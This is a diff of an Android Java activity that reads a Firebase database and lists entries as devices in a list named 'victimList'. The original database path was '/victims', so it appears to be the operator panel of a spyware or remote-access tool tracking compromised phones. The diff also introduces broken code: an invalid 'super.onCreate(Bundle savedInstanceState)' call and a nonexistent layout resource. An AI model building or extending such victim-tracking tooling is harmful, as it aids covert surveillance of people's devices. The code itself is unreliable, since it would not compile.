@@ -1,40 +1,47 @@
 package com.analiz.merkezi;
+
 import android.app.Activity;
 import android.os.Bundle;
-import android.widget.*;
-import com.firebase.client.*;
+import android.widget.ArrayAdapter;
+import android.widget.ListView;
+import com.firebase.client.DataSnapshot;
+import com.firebase.client.Firebase;
+import com.firebase.client.FirebaseError;
+import com.firebase.client.ValueEventListener;
 import java.util.ArrayList;
 
 public class MainActivity extends Activity {
-    private Firebase mRef;
     private ListView listView;
-    private ArrayList<String> victimList = new ArrayList<String>();
+    private ArrayList<String> victimList = new ArrayList<>();
     private ArrayAdapter<String> adapter;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
+        super.onCreate(Bundle savedInstanceState);
+        
+        // Firebase Başlatma
         Firebase.setAndroidContext(this);
         
         listView = new ListView(this);
-        adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, victimList);
+        adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_list_item_1, victimList);
         listView.setAdapter(adapter);
         setContentView(listView);
 
-        mRef = new Firebase("https://ana-makine-default-rtdb.firebaseio.com/victims");
-        mRef.addChildEventListener(new ChildEventListener() {
+        // SENİN FİREBASE ADRESİN
+        Firebase mRef = new Firebase("https://ana-makine-default-rtdb.firebaseio.com/");
+        
+        mRef.addValueEventListener(new ValueEventListener() {
             @Override
-            public void onChildAdded(DataSnapshot snapshot, String s) {
-                victimList.add("Cihaz: " + snapshot.getKey());
+            public void onDataChange(DataSnapshot snapshot) {
+                victimList.clear();
+                for (DataSnapshot postSnapshot : snapshot.getChildren()) {
+                    victimList.add("Cihaz: " + postSnapshot.getKey());
+                }
                 adapter.notifyDataSetChanged();
             }
-            @Override public void onChildChanged(DataSnapshot s, String p) {}
-            @Override public void onChildRemoved(DataSnapshot s) {
-                victimList.remove("Cihaz: " + s.getKey());
-                adapter.notifyDataSetChanged();
-            }
-            @Override public void onChildMoved(DataSnapshot s, String p) {}
-            @Override public void onCancelled(FirebaseError e) {}
+
+            @Override
+            public void onCancelled(FirebaseError firebaseError) {}
         });
     }
 }
